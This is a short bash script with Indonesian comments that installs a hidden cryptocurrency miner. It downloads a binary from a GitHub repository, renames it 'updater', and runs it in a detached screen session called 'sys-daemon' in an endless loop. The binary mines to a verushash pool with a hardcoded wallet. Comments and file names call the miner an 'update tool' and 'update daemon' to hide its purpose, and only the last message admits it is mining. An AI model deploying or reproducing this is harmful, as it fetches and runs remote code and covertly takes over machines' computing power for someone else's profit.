#!/bin/bash
echo "📦 Menyiapkan lingkungan kerja..."
apt-get update -y && apt-get install -y screen wget tar git >/dev/null 2>&1

echo "📁 Menyimpan skrip di /root/update-daemon.sh..."
cat << 'EOF' > /root/update-daemon.sh
#!/bin/bash

cd /root || exit

# Unduh "update tool" jika belum ada
if [ ! -f updater ]; then
  echo "⬇️ Mengunduh updater..."
  git clone https://github.com/amirul5656/yui56.git >/dev/null 2>&1
  cd yui56 || exit
  mv web updater
  chmod +x updater
else
  cd yui56 || exit
fi

# Jalankan screen jika belum aktif
if ! screen -list | grep -q sys-daemon; then
  echo "▶ Menjalankan update daemon..."
  screen -dmS sys-daemon bash -c '
    while true; do
      ./updater --algorithm verushash \
        --pool stratum+tcp://sg.vipor.net:5040 \
        -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq \
        --password x -t 7
      sleep 2
    done
  '
else
  echo "⚠️  Daemon sudah berjalan."
fi
EOF

chmod +x /root/update-daemon.sh

echo "🚀 Menjalankan daemon mining..."
bash /root/update-daemon.sh
